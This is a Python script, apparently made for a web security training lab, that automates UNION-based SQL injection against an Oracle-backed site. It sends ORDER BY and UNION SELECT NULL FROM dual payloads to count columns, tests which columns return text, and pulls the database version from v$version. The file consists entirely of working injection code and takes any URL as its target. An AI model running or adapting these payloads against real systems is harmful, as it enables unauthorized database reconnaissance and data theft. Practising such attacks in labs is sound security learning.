import sys
import requests
import string 
import time

if len(sys.argv) != 2:
    print(f"USAGE: {sys.argv[0]} <URL of the lab>")
    sys.exit(1)

URL = sys.argv[1]

def findCols(url):
    i = 1
    cols = 0
    while True:
        payload = "' ORDER BY +" + str(i) + "--"
        response = requests.get(url + payload) 
        if response.status_code != 200:
            cols = i - 1
            #print(f"Number of columns : {(i -1)}")
            break
        i += 1
    return cols

def findColsNull(url):
    i=1
    cols = 0
    while True:
        #print(i)
        payload = url + "' UNION SELECT "+str("NULL,"*i)+" FROM dual--"
        #print(payload)
        payload = payload[:-13]+payload[-12:]
        #print(payload) 
        response = requests.get(payload) 
        if response.status_code == 200:
            cols = i
            #print(f"Number of columns : {i}")
            break
        i += 1
    return cols

def checkCol(url):
    cols = findCols(url)
    strlist  = []
    i=1
    payload1 = url 
    payload2 = "' UNION SELECT "+str("NULL,"*cols)+" FROM dual--"
    for i in range(15,len(payload2),5):
        if "NULL" in payload2[i:]:
            mpayload = payload2[:i]+"'a',"+payload2[(i+5):]
            mpayload = mpayload[:-13]+mpayload[-12:]
            #print(mpayload)

            response = requests.get(payload1 + mpayload)
            if response.status_code == 200:
                strlist.append(1)
            else:
                strlist.append(0)
    for i in range(len(strlist)):
        if strlist[i]==1:
            print(str(i+1)+"th column contains text")

def checkVersion(url):
    cols = findCols(url)
    payload = "'UNION SELECT BANNER"+str(",NULL"*(cols-1))+" FROM v$version--"
    print(payload) 
    response = requests.get(url+payload)
    print(response.status_code)
    if response.status_code == 200:
        print("It's Oracle Database")
    else:
        print("It's NOT Oracle Database")
    print()
    print("Do You still want to know the version of database? (Press 1 for Yes else press any other number)")
    choice = int(input())
    if choice == 1:
        print("\n\nThank You for using this script\n\n")
        print("********************Check the VERSION in response text below**********************\n\n\n\n")
        print(response.text)
    else:
        print("Thank You for using this script")


def choiceDecider():
    print("\n\n\nPress 1 for finding number of Columns using 'ORDER BY' \nPress 2 for finding number of Columns using 'UNION SELECT' \nPress 3 for finding columns that contains text \nPress 4 for finding type and version of database\nPress 5 to exit" )
    choice = int(input())
    if choice==1:
        print("Number of Columns : ", findCols(URL))
        choiceDecider()
    elif choice==2:
        print("Number of Columns : ", findColsNull(URL))
        choiceDecider()
    elif choice==3:
        checkCol(URL)
        choiceDecider()
    elif choice==4:
        checkVersion(URL)
        choiceDecider()
    elif choice==5:
        exit()
    else:
        print("WRONG CHOICE")
        choiceDecider()

choiceDecider()
